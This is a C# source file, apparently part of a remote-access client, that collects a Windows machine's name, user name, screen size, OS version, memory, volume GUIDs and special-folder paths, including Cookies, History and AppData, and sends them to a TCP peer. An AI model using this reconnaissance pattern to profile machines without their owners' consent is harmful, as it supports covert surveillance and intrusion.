using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace RemoteClient.CommandClasses
{
    class GetInformations
    {
        public static void SendSystemInformations(TCP.Client clientMain)
        {
            try
            {
                string systems_data = get_system_os() + "|" + get_system_memory() + "|" + get_system_drive_guid();
                clientMain.Send(systems_data);
                clientMain.RecvBytes();
                clientMain.Send(get_systems_paths());
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private static string get_system_drive_guid()
        {
            try
            {
                List<string> tmp_list = new List<string>();
                ManagementObjectSearcher ms = new ManagementObjectSearcher("Select * from Win32_Volume");
                foreach (ManagementObject mo in ms.Get())
                {
                    string guid = mo["DeviceID"].ToString();

                    // ドライブレターが設定されていない場合判定しない
                    if (!(mo["DriveLetter"] == null || !(mo["DriveLetter"] is string) || mo["DriveLetter"].ToString().Length == 0))
                    {
                        var mct = Regex.Match(guid, @"{([A-Fa-f0-9]{8})\-([A-Fa-f0-9]{4})\-([A-Fa-f0-9]{4})\-([A-Fa-f0-9]{4})\-([A-Fa-f0-9]{12})}");
                        if (mct != null)
                            guid = mct.Groups[0].Value;

                        tmp_list.Add(mo["DriveLetter"].ToString().Substring(0, 1) + @": " + guid);
                        Console.WriteLine("{0}: {1}", mo["DriveLetter"].ToString().Substring(0, 1), guid);
                    }
                }
                ms.Dispose();
                return string.Join("|", tmp_list);
            }
            catch
            {
                return "";
            }
        }

        private static string get_system_memory()
        {
            try
            {
                List<string> tmp_list = new List<string>();
                ManagementClass mc = new ManagementClass("Win32_OperatingSystem");
                ManagementObjectCollection moc = mc.GetInstances();
                foreach (ManagementObject mo in moc)
                {
                    tmp_list.Add(string.Format("合計物理メモリ:{0}KB", mo["TotalVisibleMemorySize"]));
                    tmp_list.Add(string.Format("利用可能物理メモリ:{0}KB", mo["FreePhysicalMemory"]));
                    tmp_list.Add(string.Format("利用可能仮想メモリ:{0}KB", mo["FreeVirtualMemory"]));
                    mo.Dispose();
                }
                moc.Dispose();
                mc.Dispose();
                return string.Join("|", tmp_list);
            }
            catch
            {
                return "";
            }

        }

        private static string get_system_os()
        {
            try
            {
                List<string> tmp_list = new List<string>();

                OperatingSystem os = Environment.OSVersion;
                tmp_list.Add(Environment.MachineName);
                tmp_list.Add(Environment.UserName);
                tmp_list.Add(Screen.PrimaryScreen.Bounds.Height.ToString() + "x" + Screen.PrimaryScreen.Bounds.Width.ToString());
                tmp_list.Add("Windows " + os.Version.ToString());

                return string.Join("|", tmp_list);
            }
            catch
            {
                return "";
            }
        }

        private static string get_systems_paths()
        {
            List<string> tmp_list = new List<string>();

            tmp_list.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
            tmp_list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            tmp_list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
            tmp_list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
            tmp_list.Add(Environment.GetFolderPath(Environment.SpecialFolder.History));
            tmp_list.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            tmp_list.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            return string.Join("|", tmp_list);
        }

    }
}
